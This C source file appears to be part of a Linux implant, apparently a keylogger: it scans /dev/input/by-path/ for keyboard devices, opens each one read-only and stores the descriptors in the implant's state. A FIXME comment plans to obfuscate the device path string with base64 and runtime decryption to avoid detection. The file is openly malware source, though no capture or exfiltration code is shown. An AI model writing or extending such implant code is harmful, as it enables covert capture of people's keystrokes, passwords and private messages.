/**
 *  keyboard handling & locale support
 *
 *  input devices usually live in /dev/input/
 *
 *  you can identify the in the by-path subdirectory, which maps each
 *  device name to a symlink
 *
 *  here, we will return set an array of file-descriptor for each available
 *  keyboard on the machine, it should be appended with a -1 that should serve
 *  as a NULL value
 */

#include "implant.h"

#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/dir.h>
#include <sys/queue.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int
is_kbd(const struct dirent *f) {
    size_t len = 0;

    if (NULL == f)
        return 0;

    len = strlen(f->d_name);
    if (len < 4)
        return 0;

    return f->d_name[len - 3] == 'k' && f->d_name[len - 2] == 'b' &&
           f->d_name[len - 1] == 'd';
}

uint8_t fetch_available_keyboards(implant_t *instance) {

    char rpath[PATH_MAX] = {0};
    struct dirent **char_devices = NULL;
    int possible_paths = 0;

    /* FIXME(djnn): base64 then decrypt string at runtime */
    const char *dev_input_by_path = "/dev/input/by-path/";

    if (!instance) {
#ifdef DEBUG
        DEBUG_LOG("[!] NULL ptr for instance struct\n");
#endif
        return ERROR;
    }

    possible_paths = scandir(dev_input_by_path, &char_devices, &is_kbd, &alphasort);
    if (-1 == possible_paths) {
#ifdef DEBUG
        DEBUG_LOG("could not find possible keyboard paths\n");
#endif
        return ERROR;
    }

    if (0 > chdir(dev_input_by_path)) {
#ifdef DEBUG
        DEBUG_LOG("could not chdir to %s\n", dev_input_by_path);
#endif
        for (int i = 0; i < possible_paths; i++)
            free(char_devices[i]);
        free(char_devices);
        return ERROR;
    }

    /* prepare TAILQ  */
    TAILQ_INIT(&instance->kbd);
    for (int ctr = -1; ++ctr < possible_paths;) {
        if (!realpath(char_devices[ctr]->d_name, rpath)) {

#ifdef DEBUG
            DEBUG_LOG("[!] Could not run realpath(%s): %s\n", char_devices[ctr]->d_name, strerror(errno));
#endif

            continue;
        }

        keyboard_t *kbd = malloc(sizeof(keyboard_t));
        if (!kbd) {

#ifdef DEBUG
            DEBUG_LOG("[!] allocate memory for keyboard_t\n");
#endif

            continue;
        }

        kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
        if (kbd->fd < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] Could not open %s: %s\n", rpath, strerror(errno));
#endif

            free(kbd);
            continue;
        }

        bzero(kbd->name, STRING_BUFFER_SIZE);
        if (!strncpy((char *)kbd->name, rpath, (STRING_BUFFER_SIZE - 1))) {

#ifdef DEBUG
            DEBUG_LOG("[!] strncpy: kbd->name could not be copied\n");
#endif

            close(kbd->fd);
            free(kbd);
            continue;
        }
        TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);

#ifdef DEBUG
        DEBUG_LOG("[+] Keyboard found: %s (fd=%d)\n", kbd->name, kbd->fd);
#endif
    }

#ifdef DEBUG
    int kbd_count = 0;
    keyboard_t *k;
    TAILQ_FOREACH(k, &instance->kbd, devices) { kbd_count++; }
    DEBUG_LOG("[*] Total keyboards detected: %d\n", kbd_count);
#endif

    for (int i = 0; i < possible_paths; i++) {
        free(char_devices[i]);
    }
    free(char_devices);

    return TAILQ_EMPTY(&instance->kbd) ? ERROR : SUCCESSFUL;
}
